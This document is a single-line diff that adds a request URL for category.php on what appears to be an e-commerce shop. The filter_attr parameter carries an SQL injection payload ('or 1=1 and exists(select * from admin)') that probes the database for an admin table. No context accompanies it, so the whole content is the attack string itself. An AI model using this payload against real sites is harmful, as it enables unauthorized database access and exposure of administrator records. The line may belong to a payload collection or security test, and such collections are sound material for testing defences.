@@ -1,0 +1,1 @@
+category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999 or 1=1 and exists(select * from admin)
